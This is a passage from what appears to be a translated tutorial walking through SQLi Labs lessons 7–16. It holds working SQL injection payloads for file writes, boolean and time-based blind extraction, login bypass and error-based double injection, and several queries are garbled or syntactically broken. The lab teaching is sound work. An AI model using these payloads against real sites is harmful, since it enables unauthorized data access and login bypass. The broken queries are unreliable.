+<p><code>?id=2′)) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –+</code></p>
+<p><img alt="103.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/103.png" /></p>
+<p>Now check the union2.txt file:</p>
+<p><img alt="105.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/105.jpg" /></p>
+<p>In this way, we can change the string to get more information, such as database version, current user, etc., as we already did in the previous lessons.</p>
+<h2 id="lesson-8-blind-boolean-based-single-quotes"><a name="user-content-lesson-8-blind-boolean-based-single-quotes" href="#lesson-8-blind-boolean-based-single-quotes" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 8: Blind Boolean-based single quotes</h2>
+<p>In this lesson we will learn to perform blind injections. Let us start from enumeration and try to break the query:</p>
+<p><code>?id=1′</code><br />
+<code>?id=1)</code></p>
+<p><img alt="106.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/106.png" /></p>
+<p>After injecting some queries we see that we do not have an error message on the screen. Hence we are not sure here that the injection exists on this page or not. That is why this type of injection is called blind injection. There are two types of blind injection, Boolean-based and time-based injections.</p>
+<p>Let us start from the basics; start mysql and select the default database:</p>
+<p><code>use security;</code></p>
+<p><img alt="108.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/108.jpg" /></p>
+<p>Now we introduce a new function, length:</p>
+<p><code>select length(database());</code></p>
+<p><img alt="110.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/110.jpg" /></p>
+<p>Let us ask the database some small questions like what is the first character of the database. If the first character of the database is S, it will return a reply which is true. If the second character is A, then the database will reply false, since A<br />
+does not belong to the database name, but E also gives true. Now we use another technique, in which we change the way of querying the database and it responds back. There is a function to break up the strings into part; it is called sub string. The query is</p>
+<p><code>select substr(database(),1,1);</code></p>
+<p><img alt="112.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/112.jpg" /></p>
+<p>We use a new function called ASCII function. This function is used for getting the ASCII value of a string. This will make easier for us to detect the first letter of database, as shown in the screenshot below. We have a value of 115 and the query used is</p>
+<p><code>select ascii(substr(database(),1,1));</code></p>
+<p><img alt="115.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/115.jpg" /></p>
+<p>Now we check the value of 115 in the ASCII sheet.</p>
+<p><img alt="117.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/117.jpg" /></p>
+<p>Let us check the value of the second letter, E. It is 101.</p>
+<p><img alt="119.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/119.jpg" /></p>
+<p>Let us check the value in mysql query: </p>
+<p><code>select ascii(substr(database(),2,1));</code></p>
+<p><img alt="121.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/121.jpg" /></p>
+<p>In the same way, we can get more ASCII values. We evaluate the query</p>
+<p>Select ascii(substr(database(),2,1)) = 101;<br />
+equal to 101.<br />
+Yes it is true; the returned value is 1 since the letter E has the ASCII value 101.</p>
+<p><img alt="124.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/124.jpg" /></p>
+<p>Next we check this query:</p>
+<p><code>select ascii(substr(database(),2,1)) &lt; 101;</code></p>
+<p><img alt="127.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/127.jpg" /></p>
+<p>The result is false because it is equal to 0, since the ASCII value is not less than 101. Let us try to guess the 3rd character by this query:</p>
+<p><code>select ascii(substr(database(),3,1)) &lt; 101;</code></p>
+<p><img alt="130.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/130.jpg" /></p>
+<p>And the result is 1, meaning true. So make it 97 then. Use</p>
+<p><code>select ascii(substr(database(),3,1)) &lt; 97;</code></p>
+<p>And the result is 0; it means false, hence the valid value lies between 97 and 101. So now keep trying to guess all values from 97 to 101.</p>
+<p><img alt="134.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/134.jpg" /></p>
+<p>We get the 3rd value which is 99 and check it in the ASCII table sheet.</p>
+<p><img alt="136.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/136.jpg" /></p>
+<p><img alt="138.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/138.jpg" /></p>
+<p>Now we use this query in the URL:</p>
+<p><code>?id=1′ AND (ascii(substr((select database()) ,3,3)) = 99 –+</code></p>
+<p>and we are through.<br />
+You are<br />
+in…………….<br />
+It means the value 99 is true.</p>
+<p><img alt="141.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/141.jpg" /></p>
+<p>Let us see what happens if we change the value 99 to 98:</p>
+<p><code>?id=1′ AND (ascii(substr((select database()) ,3,3)) = 98</code></p>
+<p>We see that nothing happens on screen and we conclude that we get a false.</p>
+<p><img alt="143.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/143.jpg" /></p>
+<p>Now we start to enumerate the database. The query is</p>
+<p><code>id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) &lt; 105 –+</code></p>
+<p>and we see<br />
+a message<br />
+You are in……….<br />
+It means true.</p>
+<p><img alt="144.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/144.png" /></p>
+<p>Now let us try value 101:</p>
+<p><code>id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –+</code></p>
+<p>and we see a message<br />
+You are in……</p>
+<p><img alt="145.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/145.png" /></p>
+<p>It means the 1st letter is E for Email.</p>
+<h1 id="lessons-9-10-blind-injection-time-based"><a name="user-content-lessons-9-10-blind-injection-time-based" href="#lessons-9-10-blind-injection-time-based" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lessons 9 &amp; 10: Blind injection time-based</h1>
+<p>Lab 9 does not give us a signal or an error that we have tampered the query, which results in Mysql error. So now it makes us check whether SQL injection is possible.</p>
+<p><img alt="146.jpg" src="./img/146.jpg" /></p>
+<p>Here we introduce how to use the sleep command in Mysql. What we see from the screenshot is that we get a response 10 sec after running the query, so the Mysql sleeps for 10 seconds.</p>
+<p><img alt="147.jpg" src="./img/147.jpg" /></p>
+<p>Now when we run another query select if<br />
+((select database()=”security”, sleep(10), null); we get the response 10 seconds after giving us the result that a database security exists. This is also known as a time-based SQL query.</p>
+<p>Similarly if we try to run the query select if ((select database()=”securi”, sleep(10), null);<br />
+there is no time-based response from the SQL server which means that such a database does not exist.</p>
+<p><img alt="150.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/150.jpg" /></p>
+<p>Now we do the same thing in our browser query.</p>
+<p>We alter the parameter with</p>
+<p>?id=1′ and ((select database()=”security”, sleep(10), null);</p>
+<p>There is a waiting response from the browser which you can notice at the bottom of the screenshot below. Since the time-based SQL query was able to detect a legitimate database it gives us the response. If the database name were incorrect, we would not have got a waiting response.</p>
+<p><img alt="151.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/151.png" /></p>
+<h1 id="lessons-11-12-post-error-based-single-double-quotes"><a name="user-content-lessons-11-12-post-error-based-single-double-quotes" href="#lessons-11-12-post-error-based-single-double-quotes" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lessons 11 &amp; 12: Post Error-based single &amp; double quotes</h1>
+<p>In Lessons 11 &amp; 12 we come to error-based SQL Injections in HTML forms. So we have a login page and we try to login using username=”admin” password=”password“. We get a failed login attempt response.</p>
+<p><img alt="152.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/152.png" /></p>
+<p>Now we try the query again, using username=” ‘ ” and password= ” ‘ “ (single quotes). We get a login failed attempt again.</p>
+<p><img alt="153.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/153.png" /></p>
+<p>Similarly, the failed login error appears for double quotes for both username and password. But when we enter a double quote for just the username the SQL breaks and has an error.</p>
+<p><img alt="155.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/155.jpg" /></p>
+<p>When we use a backslash (/)<br />
+we get a better understanding of the query. We come to the result that we have a double quote followed by the bracket. Hence we have successfully derived the query. So the knowledge we take out from this result is that the developer has used the query</p>
+<p>Select * from TABLE where username= (“$uname”) and password=(“$password”) LIMIT 0,1</p>
+<p><img alt="156.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/156.png" /></p>
+<p>Now in order to fix the query so that it works, we can balance the quotes or comment out the rest of the query. So I comment out the rest of my query in the username field</p>
+<p><img alt="157.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/157.png" /></p>
+<p>Now as I press enter, it becomes a valid query though we are not able to login and it does not give us an error message.</p>
+<p><img alt="158.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/158.png" /></p>
+<p>Now we alter the username to “) or 1=1 #:</p>
+<p><img alt="160.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/160.jpg" /></p>
+<p>And we are successfully able to login. Cheers J</p>
+<p><img alt="162.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/162.jpg" /></p>
+<p>Similarly, we may get the records for the second user through the username “) or 1=1 LIMIT 2,1 #</p>
+<p>The query simply checks for the second OR condition, validates the user, and prints the record of the second row.</p>
+<h1 id="lessons-13-14-double-injection-single-quotes-with-string"><a name="user-content-lessons-13-14-double-injection-single-quotes-with-string" href="#lessons-13-14-double-injection-single-quotes-with-string" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lessons 13 &amp; 14: Double-injection single quotes with string</h1>
+<p>Now I will demonstrate Lesson 14 and leave Lesson 13 for readers to practice. It uses the same mechanism as we have used in this lab.</p>
+<p>Inputting a large number or a single quote as a username and password does not work. It still gives us a “Login Attempt Failed” message.</p>
+<p><img alt="163.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/163.png" /></p>
+<p>Now we try the double quotes in the username and voila, the query breaks.</p>
+<p><img alt="1655.jpg" src="./img/1655.jpg" /></p>
+<p>So what we can infer from this error message is that there is</p>
+<p>‘ “/” and password=” ” LIMIT 0,1 ‘ at line 1</p>
+<p>Now we use ” or 1 # to bypass the login and we have success. The reason is that the 1 used after OR resolves to true and as a result we have successful query. The password is not matched since we commented out the rest of the query.</p>
+<p><img alt="167.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/167.jpg" /></p>
+<p>Success!!</p>
+<p><img alt="169.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/169.jpg" /></p>
+<p>Now we move on to the next query, which is<br />
+Select<br />
+concat((select database()));</p>
+<p>This basically selects the database and dumps it as a string. If we add the floor and random function to it, it becomes</p>
+<p>select concat((select database() ), floor(rand(0)*2 ));</p>
+<p>And we have security being concatenated in the output:</p>
+<p><img alt="172.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/172.jpg" /></p>
+<p>We use the information schema table as covered previously to build our query further:</p>
+<p>select 1 from (select concat(<em>), ( concat((select database() ), floor(rand(0)</em>2 ))c from information_schema.tables group by c)a;</p>
+<p>And we use it on the username. Please remember to concat your query so that the query gets executed.</p>
+<p><img alt="174.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/174.jpg" /></p>
+<h1 id="lessons-15-16-blind-boolean-time-based-with-single-and-double-quotes"><a name="user-content-lessons-15-16-blind-boolean-time-based-with-single-and-double-quotes" href="#lessons-15-16-blind-boolean-time-based-with-single-and-double-quotes" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lessons 15 &amp; 16: Blind Boolean time-based with single and double quotes.</h1>
+<p>So now we move on to POST Parameter Blind-based Boolean injections which are like 1 or 1=1,</p>
+<p>1 AND 1=1, which means for the first query we have the Boolean value 1 and for the second we also have the Boolean value 1, which equals to TRUE, since an AND function is involved. In order to bypass the lab session 16 we use “) or (“1″)=”1<br />
+for bypassing the login. We comment the query by using # if we just want to enter the username.</p>
+<p><img alt="175.jpg" src="./img/175.jpg" /></p>
+<p>Now we move on to our next demonstration using Boolean-based blind SQL injections. This time we form the query<br />
+“) or AND sleep(15) #<br />
+but the query gets no response. We try to correct our query by using “) or OR sleep(15)</p>
+<h1 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a></h1>
+<p>The query eventually becomes</p>
+<p>select col1, col2 from TABLE where username= (” “) or sleep(15)”) and password=(” user data”);</p>
+<p>Now since the “) does not result in TRUE, the AND statement fails and the OR statement executes successfully. Now if we change our AND query to admin”) or OR sleep(15) # we have a valid query and it results in TRUE, so our query gets successfully executed.</p>
+<p><img alt="177.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/177.jpg" /></p>
+<p>A special note of thanks for Audi 1 for his amazing test bed SQLi Labs and videos.</p></body></html>
